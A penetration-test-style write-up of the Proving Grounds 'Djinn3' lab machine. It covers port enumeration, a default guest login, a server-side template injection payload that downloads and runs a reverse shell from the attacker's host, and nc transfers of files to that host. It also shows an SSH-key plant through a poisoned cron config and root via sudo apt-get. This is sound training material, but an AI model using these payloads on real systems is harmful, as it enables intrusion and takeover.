# Penetration Test Report for Proving Grounds - Djinn3
- **Author:** Joey Melo
- **Date:** March 23, 20222
- **Client:** Proving Grounds
- **Host:** 192.168.99.102 (Djinn3)

## Disclaimer
The following report is the solution of a challenge in a learning platform that has no association whatsoever with the author. Please consider this report as a rough simulation of what a real pentesting report looks like. Attempting to use the methodologies demonstrated in this report in unauthorized networks is ILLEGAL. The author is not responsible for improper use or unauthorized modifications of this information. The author assumes no liability for the use of information disclosed in this report. Any damage or loss that may result from improper use of the information contained in this report is the sole responsibility of the user and not the author. The author recommends safe practices and an ethical standpoint when working with clients and or with tools demonstrated in this report.

## Introduction
This penetration test report contains all efforts that were conducted in order to assess the security of Proving Grounds. This report contains all items that were used to penetrate and gain privileged access to the remote host(s). The purpose of this report is to showcase that the tester has a full understanding of penetration testing methodologies as well as the technical knowledge to perform professional cybersecurity assessments.

## Objectives
The objective of this assessment is to perform an internal penetration test against the Djinn3 network. The tester is tasked with following a methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how one would start from beginning to end, including the overall report.

## Executive Summary
The tester was tasked with performing an internal penetration test towards the Djinn3 network. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks similar to those of a hacker and attempt to infiltrate Proving Grounds's internal lab systems. The tester's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Proving Grounds.
When performing the internal penetration test, there were several alarming vulnerabilities that were identified on the Djinn3 network. When performing the attacks, the tester was able to gain access to the machine, primarily due to an exposed HTTP server on port 5000 which gives sufficient information about the credentials to access the ticketing service on port 31337, which is vulnerable to server-side template injection. The host has been successfully exploited, and privileged access was gained in the machine.

## Recommendations
The tester recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and, once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Assessment
Note: The host IP changes throughout the screenshots in the assessment as machine resets were necessary.

## Service Enumeration
### Port Scan Results
- **TCP:** 22,80,5000,31337

## Initial Access
### Vulnerability Explanation
The remote host has a HTTP service running on port 5000 with sensitive information. The sensitive information can be used to guess the password to access the ticketing service running on port 31337, which is vulnerable to server-side template injection. 
### Vulnerability Fix
Restrict access to port 5000. Enforce a stronger password policy to access the ticketing service and remove default credentials.
### Attack Walkthrough
During the port scan analysis, the tester noticed an uncommon service running on port 31337 and an HTTP server running on port 5000, which is also uncommon.

![Port 31337 open](https://imgur.com/gkRZQKA.png)

![Port 5000 reveals guest user](https://imgur.com/Cr8QBiZ.png)

With unauthenticated access to port 5000, the tester obtained access to sensitive information from the tickets, which was helpful in guessing the credentials to the ticketing service running on port 31337. The tester successfully logged in with the following credentials.
```
Username: guest
Password: guest
```

![Guest login successful](https://imgur.com/llkW0po.png)

After enumerating the service, the tester concluded that it was running a python script vulnerable to server-side template injection. The tester was able to open a new ticket and poison it with malicious code to obtain remote code execution and, consequently, a reverse shell in the system.
```bash
# In the ticketing application running on port 31337
open
Title: evil_ticket
Description: {{request.application.__globals__.__builtins__.__import__('os').popen('wget http://192.168.49.99/revshell.elf -O /tmp/revshell && chmod +x /tmp/revshell && /tmp/revshell').read()}}
```

![Malicious ticket inserted](https://imgur.com/FhWlKn5.png)

As proof of exploitation, the tester captured the *local.txt* flag.

![User flag](https://imgur.com/FcFJ22Y.png)

## Privilege Escalation
### Vulnerability Explanation
The remote host has python-compiled configuration files, which can be easily decompiled. The files reveal a cronjob running for the *saint* user, which reads a specific configuration file in the */tmp* folder. An attacker can create a malicious file to trick the cronjob and get access as *saint* via ssh. The user *saint* is able to add a recently deleted user that still has sudo privileges to run the *apt-get* command. An attacker can abuse the sudo permissions in *apt-get* to escalate privileges in the host.
### Vulnerability Fix
Limit access to .pyc files and cleanup after removing users from the machine (make sure they are not still listed to run privileged tasks)
### Attack Walkthrough
After establishing a foothold on the target, the tester noticed two .pyc configuration files in the */opt* directory.

![Compiled configuration scripts in /opt folder](https://imgur.com/0X41v1R.png)

The tester was able to obtain access to the source code using a simple python decompiler:
```python
# uncompyle6 version 3.8.0
# Python bytecode 3.8.0 (3413)
# Decompiled from: Python 2.7.18 (default, Feb 22 2022, 11:45:08) 
# [GCC 11.2.0]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: configuration.py
# Compiled at: 2020-06-04 10:49:49
# Size of source mod 2**32: 1343 bytes
import os, sys, json
from glob import glob
from datetime import datetime as dt

class ConfigReader:
    config = None

    @staticmethod
    def read_config(path):
        """Reads the config file
        """
        config_values = {}
        try:
            with open(path, 'r') as (f):
                config_values = json.load(f)
        except Exception as e:
            try:
                print("Couldn't properly parse the config file. Please use properl")
                sys.exit(1)
            finally:
                e = None
                del e

        else:
            return config_values

    @staticmethod
    def set_config_path():
        """Set the config path
        """
        files = glob('/home/saint/*.json')
        other_files = glob('/tmp/*.json')
        files = files + other_files
        try:
            if len(files) > 2:
                files = files[:2]
            else:
                file1 = os.path.basename(files[0]).split('.')
                file2 = os.path.basename(files[1]).split('.')
                if file1[(-2)] == 'config':
                    if file2[(-2)] == 'config':
                        a = dt.strptime(file1[0], '%d-%m-%Y')
                        b = dt.strptime(file2[0], '%d-%m-%Y')
                if b < a:
                    filename = files[0]
                else:
                    filename = files[1]
        except Exception:
            sys.exit(1)
        else:
            return filename
# okay decompiling configuration.cpython-38.pyc
```

```python
# uncompyle6 version 3.8.0
# Python bytecode 3.8.0 (3413)
# Decompiled from: Python 2.7.18 (default, Feb 22 2022, 11:45:08) 
# [GCC 11.2.0]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: syncer.py
# Compiled at: 2020-06-01 07:32:59
# Size of source mod 2**32: 587 bytes
from configuration import *
from connectors.ftpconn import *
from connectors.sshconn import *
from connectors.utils import *

def main():
    """Main function
    Cron job is going to make my work easy peasy
    """
    configPath = ConfigReader.set_config_path()
    config = ConfigReader.read_config(configPath)
    connections = checker(config)
    if 'FTP' in connections:
        ftpcon(config['FTP'])
    else:
        if 'SSH' in connections:
            sshcon(config['SSH'])
        else:
            if 'URL' in connections:
                sync(config['URL'], config['Output'])


if __name__ == '__main__':
    main()
# okay decompiling syncer.cpython-38.pyc
```

In summary, the source code reveals that a cron job is running for the *saint* user, which looks for a `.config.json` file in the */tmp* folder with a date prepended to it. The task that the cron job runs is fetching an external file (via FTP, SSH, or URL) and inserting it in the system.
The tester abused this functionality to create a malicious file and wait for the cron job to fetch it. The tester poisoned the file with an ssh key to access the remote host without the need for a password.
The following exploit was used in a file named "23-03-2022.config.json":
```json
{                                                                                                                            
        "URL":"http://192.168.49.99/id_rsa.pub",                                                                              
        "Output":"/home/saint/.ssh/authorized_keys"                                                                          
}  
```

With ssh access to the machine, the tester noticed that the *saint* user was able to add new users to the system. Based on one of the tickets exposed on port 5000, a few users had been removed from the system (jason, david and freddy). The tester tried re-adding them to see what privileges they had.

```bash
sudo adduser jason --gid 0
```

![Lateral movement from *saint* user to *jason* user](https://imgur.com/AQYaaKp.png)

After adding the *jason* user, the tester noticed he could run *apt-get* with elevated privileges. This was used to obtain a privileged shell in the system.
```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

## Post-Exploitation
As proof of post-exploitation, the tester captured the *proof.txt* flag.

![Root flag](https://imgur.com/YrgU4Vh.png)

# Appendix A: Commands Issued
```bash
# Enumeration
sudo nmap -sC -sV -p- -oN tcp_scan.nmap -T4 192.168.88.102
nc -v 192.168.88.102 31337
curl http://192.168.88.102:5000

# Exploit
## Setup revshell and listener
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f elf -o revshell.elf
python3 -m http.server 80
nc -lvnp 1337
## Send malicious payload to binary
nc -v 192.168.88.102 31337   
## In the connection
username> guest
password> guest
open
Title: evil_ticket
Description: {{request.application.__globals__.__builtins__.__import__('os').popen('wget http://192.168.49.99/revshell.elf -O /tmp/revshell && chmod +x /tmp/revshell && /tmp/revshell').read()}}
## In the browser:
http://192.168.88.102:5000/ # Look for ticket named "evil_ticket"

# Initial Access
cd /var/www
cat local.txt
ifconfig

# Privilege Escalation
cd /opt
## Decrypting .pyc files
### In kali
nc -lvnp 9000 > configuration.cpython-38.pyc
### In djinn
nc -w 3 192.168.49.99 9000 < .configuration.cpython-38.pyc
### In kali
nc -lvnp 9000 > syncer.cpython-38.pyc
### In djinn
nc -w 3 192.168.49.99 9000 < .syncer.cpython-38.pyc
### In kali
pip install uncompyle6
python /usr/local/bin/uncompyle6 configuration.cpython-38.pyc > decompiled-configuration.cpython-38.py
python /usr/local/bin/uncompyle6 syncer.cpython-38.pyc > decompiled-syncer.cpython-38.py
## Creating evil payload
nano 23-03-2022.config.json
### File contents
{                                                                                                                            
        "URL":"http://192.168.49.99/id_rsa.pub",                                                                              
        "Output":"/home/saint/.ssh/authorized_keys"                                                                          
}  
## In kali
cp /home/kali/.ssh/id_rsa.pub .
python3 -m http.server 80 # wait 3 minutes
ssh -i /home/kali/.ssh/id_rsa saint@192.168.99.102
## In djinn, as saint
sudo -l
sudo adduser jason --gid 0
su jason
## In djinn as jason
sudo -l
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# Post-Exploitation
cd /root
cat proof.txt
ifconfig
```
